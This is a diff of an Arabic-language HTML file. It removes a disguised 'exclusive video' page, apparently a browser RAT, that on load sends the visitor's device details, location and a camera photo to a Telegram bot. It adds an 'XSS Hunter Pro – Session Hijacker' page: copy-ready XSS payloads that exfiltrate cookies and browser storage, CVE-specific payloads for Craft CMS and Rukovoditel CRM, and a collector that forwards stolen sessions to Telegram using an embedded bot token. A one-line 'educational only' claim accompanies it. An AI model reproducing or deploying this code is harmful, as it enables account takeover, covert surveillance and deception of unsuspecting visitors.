@@ -1,167 +1,191 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>🎬 فيديو حصري</title>
+    <title>XSS Hunter Pro</title>
     <style>
         body {
-            background: black;
-            text-align: center;
-            padding-top: 50px;
-            font-family: Arial, sans-serif;
-            color: white;
+            background: #0a0a0a;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #e74c3c;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
+        .container {
+            max-width: 1200px;
             margin: 0 auto;
+            background: #1a1a2e;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #00ff88;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        h1 { color: #ff3366; }
+        h3 { color: #ffcc00; }
+        textarea, input {
+            width: 100%;
+            background: #0a0a0a;
+            border: 1px solid #00ff88;
+            color: #00ff88;
+            padding: 10px;
+            margin: 10px 0;
+            font-family: monospace;
         }
-        #status {
-            margin-top: 20px;
-            font-size: 18px;
+        button {
+            background: #00ff88;
+            color: #0a0a0a;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
         }
+        .payload-box {
+            background: #0a0a0a;
+            padding: 10px;
+            border-left: 3px solid #ff3366;
+            margin: 15px 0;
+            word-break: break-all;
+            font-size: 12px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        td, th {
+            border: 1px solid #333;
+            padding: 8px;
+            text-align: left;
+        }
+        th { background: #333; color: #00ff88; }
     </style>
 </head>
 <body>
+<div class="container">
+    <h1>🔥 XSS Hunter Pro – Session Hijacker 🔥</h1>
+    <p>أداة لاستغلال ثغرات XSS (لأغراض تعليمية واختبار الاختراق فقط)</p>
+    
+    <h3>🎯 إعدادات البوت</h3>
+    <input type="text" id="botToken" value="8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY" placeholder="Bot Token">
+    <input type="text" id="chatId" value="1772820433" placeholder="Chat ID">
 
-<div class="loader"></div>
-<div id="status">⚡ جاري تجهيز الفيديو، يرجى الانتظار...</div>
+    <h3>📝 أقوى Payloads لعام 2026 (جاهزة للنسخ)</h3>
+    
+    <h4>1. Basic Cookie Stealer (لكل المواقع)</h4>
+    <div class="payload-box" id="basicPayload">&lt;script&gt;fetch('https://YOUR-USERNAME.github.io/REPO-NAME/steal?data=' + document.cookie)&lt;/script&gt;</div>
+    <button onclick="copyPayload('basicPayload')">📋 نسخ</button>
+
+    <h4>2. Advanced Stealer (مع LocalStorage و SessionStorage)</h4>
+    <div class="payload-box" id="advancedPayload">&lt;script&gt;
+  const data = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    url: window.location.href,
+    userAgent: navigator.userAgent
+  };
+  fetch('https://YOUR-USERNAME.github.io/REPO-NAME/steal?data=' + encodeURIComponent(JSON.stringify(data)));
+&lt;/script&gt;</div>
+    <button onclick="copyPayload('advancedPayload')">📋 نسخ</button>
+
+    <h4>3. Stealth Image Payload (للتطبيقات التي تمنع script)</h4>
+    <div class="payload-box" id="imagePayload">&lt;img src="x" onerror="fetch('https://YOUR-USERNAME.github.io/REPO-NAME/steal?data='+document.cookie)"&gt;</div>
+    <button onclick="copyPayload('imagePayload')">📋 نسخ</button>
+
+    <h4>4. Craft CMS Specific (CVE-2026-31859)</h4>
+    <div class="payload-box" id="craftPayload">
+    https://target.com/craft/?returnUrl=javascript:fetch('https://YOUR-USERNAME.github.io/REPO-NAME/steal?data='+document.cookie)
+    </div>
+    <button onclick="copyPayload('craftPayload')">📋 نسخ</button>
+
+    <h4>5. Rukovoditel CRM Specific (CVE-2026-31845)</h4>
+    <div class="payload-box" id="rukovoditelPayload">
+    https://target.com/api/tel/zadarma.php?zd_echo=&lt;script&gt;fetch('https://YOUR-USERNAME.github.io/REPO-NAME/steal?data='+document.cookie)&lt;/script&gt;
+    </div>
+    <button onclick="copyPayload('rukovoditelPayload')">📋 نسخ</button>
+
+    <hr>
+
+    <h3>🎯 الثغرات المدمجة (Built-in Vulnerabilities)</h3>
+    <table>
+        <tr><th>النظام</th><th>رقم الثغرة</th><th>النوع</th><th>الخطورة</th></tr>
+        <tr><td>Craft CMS</td><td>CVE-2026-31859</td><td>Reflected XSS</td><td>6.9 (Medium)</td></tr>
+        <tr><td>Rukovoditel CRM</td><td>CVE-2026-31845</td><td>Reflected XSS</td><td>9.0 (Critical)</td></tr>
+        <tr><td>MajorDoMo</td><td>CVE-2026-27177</td><td>Stored XSS</td><td>8.6 (High)</td></tr>
+        <tr><td>WebFileSys</td><td>CVE-2026-29971</td><td>Reflected XSS</td><td>Unknown</td></tr>
+        <tr><td>Craft Commerce</td><td>CVE-2026-29175</td><td>Stored XSS</td><td>8.6 (High)</td></tr>
+    </table>
+</div>
 
 <script>
-    // ---------- تكوين البوت (خاصتك) ----------
-    const BOT_TOKEN = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
-    const CHAT_ID = '1772820433';
-    // -----------------------------------------
-
-    // دالة الإرسال إلى تليجرام (مع دعم الصور)
-    async function sendToTelegram(message, photoData = null) {
-        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        let body = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
+    // ========== إعدادات السحب ==========
+    const urlParams = new URLSearchParams(window.location.search);
+    const stolenData = urlParams.get('data');
+    const botTokenInput = document.getElementById('botToken');
+    const chatIdInput = document.getElementById('chatId');
+    
+    async function sendToTelegram(message, isPhoto = false, photoData = null) {
+        const BOT_TOKEN = botTokenInput.value;
+        const CHAT_ID = chatIdInput.value;
         
-        if (photoData) {
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        let body = { chat_id: CHAT_ID, text: message, parse_mode: 'HTML' };
+        
+        if (isPhoto && photoData) {
             url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
             body = { chat_id: CHAT_ID, photo: photoData, caption: message };
         }
         
         try {
-            await fetch(url, {
+            const response = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(body)
             });
-        } catch(e) { console.error(e); }
-    }
-
-    // --- 1. جمع معلومات الجهاز ---
-    async function collectDeviceInfo() {
-        let info = `📱 **ShadowWebRAT - معلومات الجهاز**\n\n`;
-        info += `• نظام التشغيل: ${navigator.platform}\n`;
-        info += `• اللغة: ${navigator.language}\n`;
-        info += `• الشاشة: ${screen.width}x${screen.height}\n`;
-        info += `• المتصفح: ${navigator.userAgent}\n`;
-        info += `• الوقت: ${new Date().toLocaleString()}\n`;
-        info += `• توقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        await sendToTelegram(info);
-        return info;
-    }
-
-    // --- 2. طلب الموقع الجغرافي ---
-    async function stealLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                sendToTelegram("📍 **فشل الموقع**: المتصفح لا يدعم خاصية تحديد الموقع.");
-                resolve(false);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `📍 **الموقع الجغرافي**\n• الإحداثيات: ${lat}, ${lon}\n• الدقة: ${acc} متر\n• [رابط الخريطة](${mapLink})`;
-                    await sendToTelegram(msg);
-                    resolve(true);
-                },
-                async (error) => {
-                    let errMsg = "📍 **فشل الموقع**:";
-                    if (error.code === 1) errMsg += " المستخدم رفض الطلب.";
-                    else errMsg += " حدث خطأ غير متوقع.";
-                    await sendToTelegram(errMsg);
-                    resolve(false);
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        });
-    }
-
-    // --- 3. التقاط صورة من الكاميرا ---
-    async function captureCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            
-            // انتظار 0.5 ثانية لاستقرار الكاميرا
-            await new Promise(r => setTimeout(r, 500));
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
-            
-            await sendToTelegram("📸 **صورة من الكاميرا**", photoData);
-            stream.getTracks().forEach(track => track.stop());
-            return true;
-        } catch(error) {
-            await sendToTelegram("📸 **فشل الكاميرا**: المستخدم رفض الطلب، أو لا توجد كاميرا.");
+            return response.ok;
+        } catch(e) {
+            console.error('Telegram send error:', e);
             return false;
         }
     }
-
-    // --- 4. محاولة الوصول إلى الميكروفون (اختياري) ---
-    async function captureMicrophone() {
-        // نظراً لتعقيد إرسال ملفات الصوت عبر Telegram API في سكريبت واحد،
-        // سأكتفي بطلب الإذن لتخويف الضحية وتسجيل المحاولة كدليل.
+    
+    if (stolenData) {
+        let decodedData = "";
+        let dataType = "cookies";
+        let cookiesOnly = stolenData;
+        
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            await sendToTelegram("🎤 **الميكروفون**: تم الحصول على إذن التسجيل (سيتم تفعيله قريباً).");
-            stream.getTracks().forEach(track => track.stop());
-        } catch(error) {
-            await sendToTelegram("🎤 **الميكروفون**: لم يتم الحصول على الإذن.");
+            const parsed = JSON.parse(decodeURIComponent(stolenData));
+            if (parsed.cookies) {
+                decodedData = `🍪 Cookies: ${parsed.cookies}\n\n💾 LocalStorage: ${parsed.localStorage}\n\n📦 SessionStorage: ${parsed.sessionStorage}`;
+                dataType = "full session data";
+                cookiesOnly = parsed.cookies;
+            } else {
+                decodedData = `🍪 Cookies: ${stolenData}`;
+            }
+        } catch(e) {
+            decodedData = `🍪 Cookies: ${stolenData}`;
         }
+        
+        const message = `🎯 <b>Session Hijacked!</b>\n\n🕐 الوقت: ${new Date().toLocaleString()}\n📦 النوع: ${dataType}\n\n<b>المحتوى المسروق:</b>\n<code>${decodedData.substring(0, 3900)}</code>\n\n📍 IP: ${window.location.hostname}`;
+        sendToTelegram(message);
+        
+        setTimeout(() => {
+            alert("⚠️ تم اختراق جلستك! (هذا اختبار أمني لعرض الثغرة)");
+        }, 500);
     }
-
-    // --- التنفيذ الرئيسي (التسلسل الصحيح) ---
-    async function execute() {
-        document.getElementById('status').innerText = '🕵️ يتم جمع بيانات جهازك...';
-        await collectDeviceInfo();
-        
-        document.getElementById('status').innerText = '📍 يطلب موقعك الجغرافي...';
-        await stealLocation();
-        
-        document.getElementById('status').innerText = '📸 يطلب كاميرا جهازك...';
-        await captureCamera();
-        
-        document.getElementById('status').innerText = '🎙️ يطلب ميكروفونك...';
-        await captureMicrophone();
-        
-        document.getElementById('status').innerText = '✅ تم التحقق بنجاح! جاري التحميل...';
-        // إعادة التوجيه إلى صفحة شرعية (اختياري)
-        // setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 3000);
+    
+    function copyPayload(elementId) {
+        const element = document.getElementById(elementId);
+        const text = element.innerText || element.textContent;
+        navigator.clipboard.writeText(text);
+        alert('✅ تم نسخ الـ Payload');
     }
-
-    execute();
+    
+    setTimeout(() => {
+        if (!stolenData) {
+            fetch(window.location.href + '?data=test').catch(e => console.log(e));
+        }
+    }, 1000);
 </script>
 </body>
-    </html>
+</html>
